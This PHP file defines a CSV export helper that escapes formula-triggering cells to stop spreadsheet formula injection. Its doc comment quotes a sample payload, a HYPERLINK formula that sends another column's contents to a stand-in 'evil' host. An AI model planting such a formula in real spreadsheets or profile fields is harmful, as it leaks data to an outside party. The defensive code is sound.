<?php
declare(strict_types=1);

namespace Monstera\Reporting\Exporters;

/**
 * CSV output helper with spreadsheet-formula-injection neutralization.
 *
 * A cell whose first character is one of = + - @ (or a leading tab / carriage
 * return) is interpreted as a live formula by Excel, Google Sheets, and
 * LibreOffice. Because our exports contain member-controlled strings (names,
 * locations, free-text context), an attacker can plant a payload like
 * =HYPERLINK("http://evil/?"&B2,"x") in a profile field and exfiltrate other
 * columns when an admin opens the file. We prefix any such cell with a single
 * apostrophe so the value renders literally and never executes.
 *
 * Leading + / - on a genuinely numeric cell (e.g. -5) are left alone so we
 * don't corrupt negative numbers; only non-numeric formula-like values are
 * escaped.
 */
final class Csv {

	private const TRIGGERS = [ '=', '+', '-', '@', "\t", "\r" ];

	/**
	 * Write one row to an open stream, sanitizing every cell first.
	 *
	 * @param resource                          $handle Open php://output (or file) stream.
	 * @param array<int|string, scalar|null>    $row
	 */
	public static function writeRow( $handle, array $row ): void {
		fputcsv( $handle, array_map( [ self::class, 'sanitizeCell' ], array_values( $row ) ) );
	}

	/**
	 * Prefix a formula-triggering cell with an apostrophe.
	 *
	 * @param scalar|null $value
	 */
	public static function sanitizeCell( $value ): string {
		$str = (string) $value;
		if ( '' === $str ) {
			return $str;
		}

		$first = $str[0];
		if ( ! in_array( $first, self::TRIGGERS, true ) ) {
			return $str;
		}

		// Preserve legitimate signed numbers like -5 or +1.5.
		if ( ( '-' === $first || '+' === $first ) && is_numeric( $str ) ) {
			return $str;
		}

		return "'" . $str;
	}
}
